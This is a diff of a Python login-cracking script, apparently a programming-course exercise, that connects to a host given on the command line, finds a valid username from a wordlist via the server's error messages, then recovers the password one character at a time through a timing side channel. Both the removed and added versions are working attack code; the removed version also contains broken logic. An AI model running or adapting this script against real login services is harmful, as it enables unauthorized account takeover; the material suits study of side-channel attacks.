@@ -1,46 +1,39 @@
-import sys
-import socket
-import itertools
-import json
-from string import ascii_uppercase, ascii_lowercase, digits
+from sys import argv
+from socket import socket
+from string import digits, ascii_letters
+from json import dumps, loads
+from datetime import datetime
+
+address = (argv[1], int(argv[2]))
+client = socket()
+client.connect(address)
+crack = digits + ascii_letters
 
 
-class PasswordHacker:
-    def __init__(self):
-        self.address = (sys.argv[1], int(sys.argv[2]))
-        self.send_receive()
-        self.login = None
-        self.password = None
-
-    def send_receive(self):
-
-        with socket.socket() as c:
-            c.connect(self.address)
-            with open('logins.txt', 'r', encoding='utf-8') as logins:
-                for log in logins:
-                    for l in map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in log))):
-                        dictionary_send = {"login": l.strip(), "password": None}
-                        c.send((json.dumps(dictionary_send)).encode())
-                        data = c.recv(1024).decode()
-                        dictionary_rcv = json.loads(data)
-                        if dictionary_rcv['result'] == 'Wrong password!':
-                            self.login = l.strip()
-                            print(self.login)
-                            ascii_symbols = ascii_lowercase + ascii_uppercase + digits
-                            for i in ascii_symbols:
-                                dict_with_password = {"login": self.login, "password": i}
-                                print(dict_with_password)
-                                c.send((json.dumps(dict_with_password)).encode())
-                                dict_pass_rcv = json.loads(c.recv(1024).decode())
-                                print(dict_pass_rcv)
-                                if dict_pass_rcv['result'] == 'Exception happened during login':
-                                    self.password = self.password + i
-                                    self.generator = self.brute_force()
-                                    continue
-                                elif dict_pass_rcv['result'] == 'Connection success!':
-                                    print('Login:', self.login, 'Password:', self.password)
-                                    exit()
-
-
-if __name__ == '__main__':
-    PasswordHacker()
+with open("logins.txt") as logins:
+    logins = logins.readlines()
+    logins = [i.replace("\n", "") for i in logins]
+    for login in logins:
+        client.send(dumps({"login": login, "password": " "}).encode())
+        response = loads(client.recv(1024).decode())
+        if response['result'] == 'Wrong password!':
+            break
+    password = ""
+    while True:
+        for i in crack:
+            file_mine = open("pass.txt", 'a')
+            client.send(dumps({"login": login, "password": password + i}).encode())
+            file_mine.write(password + '\n')
+            start = datetime.now()
+            response = loads(client.recv(1024).decode())
+            finish = datetime.now()
+            my_file = open('time.txt', 'a')
+            my_file.write(str((finish - start).microseconds) + '\n')
+            my_file.close()
+            file_mine.close()
+            if (finish - start).microseconds > 15000:
+                password += i
+            elif response['result'] == 'Connection success!':
+                password += i
+                print(dumps({"login": login, "password": password}))
+                exit()
